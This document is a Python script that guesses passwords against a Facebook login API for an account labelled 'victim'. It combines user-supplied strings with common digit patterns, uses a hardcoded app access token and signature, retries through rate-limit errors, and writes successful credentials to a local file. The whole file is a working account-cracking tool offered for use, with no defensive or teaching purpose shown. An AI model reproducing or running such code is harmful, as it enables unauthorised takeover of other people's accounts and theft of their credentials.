import os,random,mechanize,json,time
br = mechanize.Browser()
br.set_handle_robots(False)
br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(),max_time=1)

lis=["123","1234","1233","3456","6789","13579","135790","1357902468","12345678","123456789","1212","0000","131313","2222","333","4444","55555"]
mo=0
def rd(word):
    return word[::-1]
def login(user,pswd):
    data = br.open('https://b-api.facebook.com/method/auth.login?access_token=350685531728%7C62f8ce9f74b12f84c123cc23437a4a32&format=json&sdk_version=1&email=' + user + '&locale=en_US&password=' +pswd + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
    q = json.load(data)
    if 'access_token' in q:
        print('\1;32mLogin success')
        print('\1;31m' + user + '\1;35m | \1;32m' + pswd)
        with open('moh.txt', 'a') as file:file.write("\n"+"usernme: "+user+" password: "+pswd)
        time.sleep(99999999999999)
    elif 'www.facebook.com' in q['error_msg']:
        print('\1;33mAccount Has Been Checkpoint')
        print(user + ' | ' + pswd)
        with open('moh.txt', 'a') as file:file.write("\n"+"usernme: "+user+" password: "+pswd)
        time.sleep(99999999999999)
    else:
        print('worng passwords >' + pswd)
        if q['error_code']==613:
            print("sleep")
            time.sleep(2000)
            login(user,pswd)
        if not q['error_code']==401:
            with open('moh.txt', 'a') as file:file.write("blok")
            time.sleep(3000);
            login(user,pswd)
        else:
            time.sleep(360)
victim=input("entre victim id: ")
n1=input("entre n1: ")
n2=input("entre n2: ")
for x in lis:
    login(victim,n1+x)
    login(victim,n2+x)
for x in lis:
    login(victim,x+n1)
    login(victim,x+n2)
for x in range(len(lis)):
    login(victim,lis[x+6])
    if x==9:
        break
for x in lis:
    login(victim,n1+rd(x))
    login(victim,n2+rd(x))
    if x=="1212":
        break
for x in lis:
    login(victim,rd(x)+n1)
    login(victim,rd(x)+n2)
    if x=="1212":
        break
for x in lis:
    login(victim,n1+x+x)
    login(victim,n2+x+x)
for x in lis:
    login(victim,x+x+n1)
    login(victim,x+x+n2)